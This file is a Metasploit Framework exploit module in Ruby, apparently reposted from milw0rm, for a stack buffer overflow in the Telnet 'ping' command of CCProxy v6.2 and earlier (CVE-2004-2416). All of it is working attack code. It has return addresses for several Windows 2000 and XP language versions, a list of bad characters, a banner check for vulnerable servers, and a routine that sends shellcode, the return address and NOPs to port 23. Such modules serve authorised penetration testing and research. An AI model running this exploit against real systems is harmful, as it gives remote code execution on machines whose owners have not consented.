##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/ 
##

require 'msf/core'

module Msf

class Exploits::Windows::Proxy::CCProxy_Telnet_Ping < Msf::Exploit::Remote
	
	include Exploit::Remote::Tcp

	def initialize(info = {}) 
		super(update_info(info,    
			'Name'		=> 'CCProxy <= v6.2 Telnet Proxy Ping Overflow',
			'Description'	=> %q{
            			This module exploits the YoungZSoft CCProxy <= v6.2 suite Telnet service.
				The stack is overwritten when sending an overly long address to the 'ping' command.
			},
			'Author' 	=> [ 'Patrick Webster <patrick[at]aushack.com>' ],
			'Arch'		=> [ ARCH_X86 ], 
			'License'       => MSF_LICENSE,
			'Version'       => '$Revision$',
			'References'    =>
			[
				[ 'BID', '11666 ' ],
				[ 'CVE', '2004-2416' ],
				[ 'MIL', '621' ],
				[ 'OSVDB', '11593' ],
			],         
			'Privileged'		=> false,
			'DefaultOptions'	=>
			{
				'EXITFUNC' 	=> 'thread',
			},
			'Payload' =>
				{ 
					'Space'		=> 1012,
					'BadChars' 	=> "\x00\x07\x08\x0a\x0d",
				},
			'Platform' => ['win'],
			'Targets' =>
			[
			# Patrick - Tested OK 2007/08/19. W2K SP0, W2KSP4, XP SP0, XP SP2 EN.
				[
				'Windows 2000 Pro All - English',
				{
					'Ret'	=> 0x75023411, # call esi ws2help.dll
				}
				],
				[
				'Windows 2000 Pro All - Italian',
				{
					'Ret'	=> 0x74fd2b81, # call esi ws2help.dll
				}
				],
				[
				'Windows 2000 Pro All - French',
				{
					'Ret'	=> 0x74fa2b22, # call esi ws2help.dll
				}
				],
                 		[
				'Windows XP SP0/1 - English',
				{
					'Ret'	=> 0x71aa1a97, # call esi ws2help.dll
				}
				],
                 		[
				'Windows XP SP2 - English',
				{
					'Ret'	=> 0x71aa1b22, # call esi ws2help.dll
				}
				],
			],
			'DisclosureDate' => 'Nov 11 2004'))
            
			register_options(
			[
				Opt::RPORT(23),
			], self.class)
	end

	def autofilter
		false
	end

	def check 
		connect
		banner = sock.get_once(-1,3)

		if (banner =~ /CCProxy Telnet Service Ready/)
			return Exploit::CheckCode::Appears 
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect
		
		sploit  = "p " + payload.encoded + [target['Ret']].pack('V') + make_nops(7)
		sock.put(sploit + "\r\n")

		handler
		disconnect
	end

end
end

# milw0rm.com [2007-09-03]
